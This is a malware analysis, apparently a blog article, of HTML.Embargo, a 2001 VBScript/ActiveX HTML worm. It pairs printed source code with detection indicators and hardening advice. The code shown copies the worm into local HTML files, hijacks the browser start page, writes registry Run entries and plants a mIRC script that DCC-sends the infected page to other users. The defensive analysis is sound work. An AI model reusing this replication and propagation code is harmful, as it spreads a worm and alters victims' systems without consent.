# Dissecting HTML.Embargo: An IE ActiveX HTML Worm with mIRC Hooks 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
HTML.Embargo (late May 2001) is a compact HTML-based worm that leverages Internet Explorer’s VBScript and ActiveX capabilities to manipulate the local system, replicate into other HTML files, and propagate via mIRC. It masquerades as a benign “WinHelp” page, nudging the user to enable ActiveX; once executed, the page’s script writes local files, tweaks registry settings, and sets a new homepage that embeds the original page’s body.

The sample is emblematic of early client-side worms that required no exploit—only permissive browser settings. By analyzing its source, we can map precise indicators (registry keys, file artifacts, string markers) and understand failure modes caused by coding mistakes (typos, uninitialized variables, type mismatches) that affect real-world behavior and detection.

## Overview of the Malware 🐛
HTML.Embargo pursues three outcomes: visible system changes, HTML-based replication, and peer-to-peer spread via IRC.

- Landing page and copy: Creates a local `WinHelp.htm` in the Windows directory containing the current page’s `<body>` HTML, preceded by a literal `<embargo>` marker. It then sets Internet Explorer’s Start Page to this local file and forces full-screen mode.
- One-time autorun artifact: Appends a looping “signature” block to `C:\autoexec.bat` (for DOS/Windows 9x), causing an echoing banner at boot in some legacy environments.
- mIRC propagation: If mIRC is installed, writes a `script.ini` that silently DCC-sends `WinHelp.htm` to users joining channels.
- HTML infection: Scans `Windows\WEB\WallPaper` for `.htm/.html` files and appends the worm’s body HTML to each file not already marked, effectively turning them into carriers.
- Date-based shell tweaks: On certain days (intended: 5th or 17th), writes multiple HKLM Run values for core shell tools and adjusts screensaver settings.

Execution depends entirely on IE running VBScript with sufficient privileges. There is no network C2 or exfiltration; impact is local system modification and user-driven propagation.

## Source Code Analysis 🔬
The page is a normal HTML document with an inline VBScript block. Error handling begins with blanket suppression, allowing the script to continue despite failures.

### Local Copy and Homepage Hijack
```vb
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")

Set original = document.body.createTextRange
Set copie = fso.CreateTextFile(fso.GetSpecialFolder(0) & "\WinHelp.htm")
copie.WriteLine "<embargo>"
copie.WriteLine "<HTML><HEAD><TITLE>WinHelp</TITLE></HEAD>"
copie.WriteLine "<BODY bgColor=#ffffff>"
copie.WriteLine original.htmltext
copie.WriteLine "</BODY></HTML>"
copie.Close
```
- The script snapshots the current page’s `<body>` via `createTextRange` and writes it into `WinHelp.htm` under the Windows directory (`GetSpecialFolder(0)`). The leading `<embargo>` string serves as a marker.

```vb
reg = ws.RegRead("HKLM\Software\HTML.Embargo\")
If reg <> "c parti" Then
  ' Append an “embargo” loop to autoexec.bat (legacy systems)
  ' ... rewrite C:\autoexec.bat with banner/loop ...
  ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", _
              fso.GetSpecialFolder(0) & "\WinHelp.htm"
  ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\FullScreen", "yes"
  ws.RegWrite "HKLM\Software\HTML.Embargo\", "c parti"
End If
```
- A one-time gate keyed by `HKLM\Software\HTML.Embargo\` sets the homepage to `WinHelp.htm` and flips IE to full-screen. The same block appends a DOS loop to `autoexec.bat`, which only affects some Windows 9x/ME machines.

### mIRC DCC Auto-send Hook
```vb
reg = ws.RegRead("HKLM\Software\HTML.Embargo\mirc")
If reg <> "c parti" Then
  PFD = ws.RegRead("HKLM\...\ProgramFilesDir")
  If dossier = "" Then
    If fso.FileExists("c:\mirc\mirc.ini") Then dossier = "c:\mirc"
    If fso.FileExists("c:\mirc32\mirc.ini") Then dossier = "c:\mirc32"
    If fso.FileExists(PFD & "\mirc\mirc.ini") Then dossier = PFD & "\mirc"
    If fso.FileExists(PFD & "\mirc32\mirc.ini") Then dossier = PFD & "\mirc32"
  End If
  If dossier <> "" Then
    Set script = fso.CreateTextFile(dossier & "\script.ini", True)
    script.WriteLine "[script]"
    script.WriteLine "n0=on 1:JOIN:#:{"
    script.WriteLine "n1= /if ( $nick == &me ) (halt)" ' bug: should be $me and proper syntax
    script.WriteLine "n2= ./dcc send $nick " & fso.GetSpecialFolder(0) & "\WinHelp.htm"
    script.WriteLine "n3=}"
    ws.RegWrite "HKLM\Software\HTML.Embargo\mirc", "c parti"
  End If
End If
```
- The worm hunts for mIRC install paths and writes a join-triggered DCC send rule. Two issues reduce reliability:
  - The check uses `&me` instead of `$me`, and the conditional syntax is malformed, so the self-suppression may not work.
  - `dossier` is used uninitialized; errors are suppressed globally, so missing paths are quietly ignored.

### HTML Infection of Wallpaper Folder
```vb
Set FolderObj = fso.GetFolder(fso.GetSpecialFolder(0) & "\WEB\WallPaper")
For Each cible In FolderObj.Files
  ext = LCase(fso.GetExtensionName(cible.Name))
  If ext = "htm" Or ext = "html" Then
    Set vrai = fso.OpenTextFile(cible.Path, 1, False)
    If vrai.ReadLine <> "<embargo>" Then
      vrai.Close
      ' Read original and append current page’s body HTML
      Set vrai = fso.OpenTextFile(cible.Path, 1, False)
      htmorg = vrai.ReadAll: vrai.Close
      Set virus = document.body.createTextRange
      Set vrai = fso.CreateTextFile(cible.Path, True, False)
      vrai.WriteLine htmorg
      vrai.WriteLine ""
      vrai.WriteLine virus.htmltext
      vrai.Close
    Else
      vrai.Close
    End If
  End If
Next
```
- Files under `Windows\WEB\WallPaper` are rewritten to include the worm’s body HTML. The marker check reads only the first line, but the code never writes `<embargo>` to these files—only to `WinHelp.htm`. This mismatch means legitimate files are always considered unmarked unless they happen to begin with `<embargo>`, causing repeated appends on subsequent runs.

### Date-based Registry Tweaks and Lure
```vb
If Day(Now()) = 5 Or Day(Now)) = 17 Then  ' typo: extra ) breaks the second clause
  ws.RegWrite "HKLM\...\Run\CDPlayer",  fso.GetSpecialFolder(0) & "\Cdplayer.exe"
  ws.RegWrite "HKLM\...\Run\NotePad",   fso.GetSpecialFolder(0) & "\Notepad.exe"
  ws.RegWrite "HKLM\...\Run\PaintBrush", fso.GetSpecialFolder(0) & "\Pbrush.exe"
  ws.RegWrite "HKLM\...\Run\Explorer",  fso.GetSpecialFolder(0) & "\Explorer.exe"
  ws.RegWrite "HKLM\...\Run\RegEdit",   fso.GetSpecialFolder(0) & "\Regedit.exe"
  ws.RegWrite "HKCU\Control Panel\Desktop\ScreenSaveTimeOut", "60"
  ws.RegWrite "HKCU\Control Panel\Desktop\ScreenSaveUsePassword", 1, "REG_DWORD"
End If

document.Write "<font ...>Microsoft Internet Explorer<br>Please enabled ActiveX to see this page<br></font>"
```
- Intended to run on the 5th or 17th day of the month, this block sets a flurry of HKLM Run entries pointing to Windows’ own tools and tightens the screensaver. Due to the stray parenthesis, the `= 17` condition likely errors out (silently), leaving only the 5th-day trigger operative.

### Behavior Summary
- No persistence beyond homepage and Run entries set conditionally; no services or scheduled tasks.
- Propagation is limited to mIRC DCC sends and “infection” of local HTML files that users might open or share.
- Broad error suppression hides many coding mistakes; effectiveness depends heavily on environment and user actions.

## Mitigation and Defense Strategies 🛡️
- Disable VBScript/ActiveX in IE: Use Group Policy to disable VBScript in Internet and Local Machine zones or block ActiveX entirely. Modern systems deprecate VBScript in IE; ensure legacy hosts are updated and locked down.
- Browser hardening and isolation: Enforce Protected Mode/Enhanced Protected Mode and per-site zones. Use dedicated viewers for HTML attachments and strip active content at gateways.
- Email/web gateway filtering: Quarantine HTML attachments containing `<script language=VBScript>` and references to `CreateObject("Scripting.FileSystemObject")` or `WScript.Shell`. Sanitize inbound HTML by removing ActiveX/VBScript and `document.body.createTextRange` constructs.
- IOC hunts: Look for `WinHelp.htm` in the Windows directory starting with `<embargo>`. Search for appended worm HTML in `Windows\WEB\WallPaper` files. Monitor for `HKLM\Software\HTML.Embargo\` and `...\mirc` values set to `c parti`. Inspect mIRC `script.ini` under common paths for `ON 1:JOIN` and `./dcc send` lines referencing `WinHelp.htm`.
- Registry monitoring: Alert on abrupt changes to `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page` pointing to a local file, and on mass writes to `HKLM\...\Run\` entries for core tools (Explorer, Regedit, Notepad) from a browser process.
- File integrity on legacy boot files: Flag modifications to `C:\autoexec.bat` that inject loops or banners. Although harmless on NT-family systems, it’s an artifact of execution.
- Application and privilege controls: Remove admin rights from daily accounts to limit writes to HKLM and Windows directories. Enforce application allowlisting to block browser processes from creating/modifying files under system paths.
- Incident response: Restore the original IE start page and fullscreen settings; remove `WinHelp.htm`; clean infected HTML files by removing appended body HTML; revert HKLM Run entries for shell tools; and delete or reset `HKLM\Software\HTML.Embargo\*` markers.

## Conclusion
HTML.Embargo is a straight‑forward VBScript‑in‑HTML worm: it copies its page body into a local file, hijacks the browser’s start page, appends its body to other HTML files, and uses mIRC to pass the infected page along. It exhibits multiple coding mistakes—typos, uninitialized variables, and marker mismatches—that make behavior noisy and inconsistent, but its artifacts are deterministic and easy to hunt. In modern environments, disabling VBScript/ActiveX and tightening browser isolation virtually neutralize this class. For legacy hosts, focus on IOC‑driven detection, registry/file integrity monitoring, and policy controls that prevent browsers from writing to system locations.
